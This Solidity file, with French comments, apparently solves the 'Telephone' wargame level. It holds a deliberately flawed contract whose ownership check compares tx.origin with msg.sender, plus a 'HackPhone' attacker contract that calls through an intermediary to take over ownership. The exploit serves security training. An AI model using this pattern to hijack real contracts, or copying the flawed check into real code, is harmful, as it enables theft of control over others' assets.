// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public { // Le owner du contrat est celui qui a déployé le contrat.
    owner = msg.sender;
  }

/*
C'est cette fonction qui va nous intéresser : en effet, elle a une faille.
Cette faille est celle d'utiliser tx.origin.
tx.origin correspond à l'adresse qui a initié la transaction de base
msg.sender correspond au dernier appelant
voir l'image jointe dans le dossier pour mieux comprendre
Donc si on arrive à avoir un tx.origin différent du msg.sender, on arrivera à obtenir la propriété du contrat.
*/
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

/*
Du coup, on va créer un contrat, qui lorsqu'il sera déployé aura sa propre adresse.
Ce contrat aura une fonction qui pourra être appelée, et qui elle-même appelera la fonction changeOwner du contrat Telephone.
Ce qui donnera:
Mon wallet (tx.origin) => Call la fonction ownerHacker du contrat HackPhone (msg.sender) => Call la fonction changeOwner() du contrat Telephone.
Du coup, tx.origin sera différent de msg.sender :)
*/
contract HackPhone {
    address public contractAddress;
    
    
    constructor(address _contractAddress) public { // On indiquera lors du déploiement de HackPhone, quelle est l'adresse de Telephone, vu que c'est un contrat déjà deployé.
        contractAddress = _contractAddress;
    }
    
    function ownerHacker(address newOwner) public{ // Notre fonction hack qu'on appelera avec en argument l'adresse que l'on veut injecter en tant que propriétaire du contrat Telephone
        Telephone(contractAddress).changeOwner(newOwner);
    }
}
